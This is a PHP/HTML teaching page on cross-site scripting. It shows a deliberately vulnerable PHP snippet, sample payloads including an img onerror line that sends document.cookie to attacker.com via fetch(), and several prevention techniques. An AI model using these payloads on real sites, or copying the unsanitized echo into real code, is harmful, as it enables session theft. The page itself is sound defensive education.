<?php
// xss_explanation.php
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cross-Site Scripting (XSS) Explanation</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            min-height: 100vh;
            box-sizing: border-box;
        }
        .container {
            background-color: #222;
            border-radius: 12px;
            padding: 1.5rem;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
            width: 90%;
            max-width: 800px;
            text-align: left;
            box-sizing: border-box;
        }
        h1, h2, h3 {
            color: #fff;
            margin: 1rem 0;
        }
        h1 {
            font-size: 1.8rem;
        }
        h2 {
            font-size: 1.4rem;
        }
        h3 {
            font-size: 1.2rem;
        }
        p, li {
            line-height: 1.6;
            font-size: 1rem;
            margin: 0.5rem 0;
        }
        ul, ol {
            padding-left: 1.5rem;
            margin: 1rem 0;
        }
        pre {
            background-color: #333;
            color: #0f0;
            padding: 1rem;
            border-radius: 8px;
            overflow-x: auto;
            font-size: 0.9rem;
            line-height: 1.4;
            margin: 1rem 0;
            max-height: 300px;
        }
        code {
            font-family: 'Courier New', Courier, monospace;
        }
        button {
            background-color: #444;
            color: #fff;
            border: none;
            padding: 10px 20px;
            margin-top: 1rem;
            cursor: pointer;
            border-radius: 8px;
            font-size: 1rem;
            display: inline-block;
        }
        button:hover {
            background-color: #555;
        }
        /* Responsiveness */
        @media (max-width: 768px) {
            body {
                padding: 10px;
            }
            .container {
                width: 95%;
                padding: 1rem;
            }
            h1 {
                font-size: 1.5rem;
            }
            h2 {
                font-size: 1.3rem;
            }
            h3 {
                font-size: 1.1rem;
            }
            p, li {
                font-size: 0.95rem;
            }
            pre {
                font-size: 0.85rem;
            }
            button {
                padding: 8px 16px;
                font-size: 0.95rem;
            }
        }
        @media (max-width: 480px) {
            h1 {
                font-size: 1.3rem;
            }
            h2 {
                font-size: 1.2rem;
            }
            h3 {
                font-size: 1rem;
            }
            p, li {
                font-size: 0.9rem;
            }
            pre {
                font-size: 0.8rem;
                padding: 0.8rem;
            }
            button {
                padding: 6px 12px;
                font-size: 0.9rem;
            }
        }
    </style>
</head>
<body>
<div class="container">
    <h1>Cross-Site Scripting (XSS) Vulnerability</h1>

    <h2>What is XSS?</h2>
    <p>Cross-Site Scripting (XSS) is a web security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. These scripts run in the victim’s browser, potentially stealing data, hijacking sessions, or defacing websites. XSS occurs when user input is improperly handled and displayed without sanitization.</p>

    <h2>Vulnerable Code</h2>
    <p>The following code snippet is vulnerable to XSS:</p>
    <pre>
&lt;!-- PHP example -->
&lt;?php
$user_input = $_GET['username'];
echo "Welcome, $user_input!";
?>
    </pre>
    <p>This code directly outputs <code>$user_input</code> to the page without sanitizing or encoding it, allowing malicious scripts to execute.</p>

    <h3>Why It’s Vulnerable</h3>
    <p>The code trusts <code>$user_input</code> and embeds it directly into the HTML output. Attackers can craft inputs containing JavaScript that executes in the browser. For example:</p>
    <ul>
        <li><strong>Input</strong>: <code>&lt;script&gt;alert('Hacked!')&lt;/script&gt;</code><br>
            <strong>Resulting Output</strong>: <code>Welcome, &lt;script&gt;alert('Hacked!')&lt;/script&gt;!</code><br>
            <strong>Effect</strong>: Displays a pop-up alert in the victim’s browser, demonstrating script execution.</li>
        <li><strong>Input</strong>: <code>&lt;script&gt;document.cookie='session=attacker';&lt;/script&gt;</code><br>
            <strong>Resulting Output</strong>: <code>Welcome, &lt;script&gt;document.cookie='session=attacker';&lt;/script&gt;!</code><br>
            <strong>Effect</strong>: Modifies the victim’s cookies, potentially hijacking their session.</li>
        <li><strong>Input</strong>: <code>&lt;img src="x" onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)"&gt;</code><br>
            <strong>Resulting Output</strong>: <code>Welcome, &lt;img src="x" onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)"&gt;!</code><br>
            <strong>Effect</strong>: Sends the victim’s cookies to an attacker’s server, compromising sensitive data.</li>
    </ul>
    <p>These exploits work because the application doesn’t sanitize or encode <code>$user_input</code>, allowing malicious code to be rendered as executable JavaScript in the victim’s browser.</p>

    <h2>Types of XSS</h2>
    <p>XSS attacks come in three main forms:</p>
    <ul>
        <li><strong>Reflected XSS</strong>: Malicious script is part of the URL or request (e.g., <code>?username=&lt;script&gt;alert('XSS')&lt;/script&gt;</code>) and reflected in the response. Common in search forms or error pages.</li>
        <li><strong>Stored XSS</strong>: Malicious script is stored on the server (e.g., in a database) and served to users, such as in comments or profiles. More dangerous as it affects multiple users.</li>
        <li><strong>DOM-Based XSS</strong>: The vulnerability lies in client-side JavaScript that unsafely manipulates the DOM, e.g., using <code>document.write(location.search)</code> without sanitization.</li>
    </ul>

    <h2>Techniques to Prevent XSS</h2>
    <p>To secure applications against XSS, use these best practices:</p>
    <ol>
        <li><strong>Output Encoding</strong>:
            <p>Encode user input before displaying it to ensure it’s treated as data, not executable code.</p>
            <pre>
&lt;!-- PHP example -->
&lt;?php
$user_input = $_GET['username'];
echo "Welcome, " . htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8') . "!";
?>
            </pre>
            <p><strong>Why It Works</strong>: Converts special characters (e.g., <code>&lt;</code>, <code>&gt;</code>) into safe HTML entities (e.g., <code>&amp;lt;</code>, <code>&amp;gt;</code>), preventing script execution.</p>
        </li>
        <li><strong>Input Validation</strong>:
            <p>Restrict input to expected formats, rejecting or sanitizing anything suspicious.</p>
            <pre>
&lt;?php
$user_input = $_GET['username'];
if (!preg_match('/^[a-zA-Z0-9]*$/', $user_input)) {
    die("Invalid username.");
}
echo "Welcome, " . htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8') . "!";
?>
            </pre>
            <p><strong>Why It Works</strong>: Ensures only safe characters (e.g., alphanumeric) are accepted, reducing the risk of malicious input.</p>
        </li>
        <li><strong>Content Security Policy (CSP)</strong>:
            <p>Implement a CSP header to restrict which scripts can run.</p>
            <pre>
// HTTP Header
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
            </pre>
            <p><strong>Why It Works</strong>: Blocks inline scripts and external scripts from untrusted sources, mitigating XSS even if malicious code is injected.</p>
        </li>
        <li><strong>Use Safe Frameworks</strong>:
            <p>Use frameworks that automatically escape output, such as React, Angular, or modern PHP templates.</p>
            <pre>
// React example
function Welcome({ username }) {
    return &lt;div&gt;Welcome, {username}!&lt;/div&gt;;
}
            </pre>
            <p><strong>Why It Works</strong>: These frameworks encode output by default, reducing the risk of XSS unless explicitly bypassed.</p>
        </li>
        <li><strong>HTTP-Only Cookies</strong>:
            <p>Mark cookies as HTTP-only to prevent access via JavaScript.</p>
            <pre>
&lt;?php
setcookie('session', 'value', ['httponly' => true]);
?>
            </pre>
            <p><strong>Why It Works</strong>: Even if an XSS attack occurs, attackers can’t steal session cookies via <code>document.cookie</code>.</p>
        </li>
    </ol>


</div>
</body>
</html>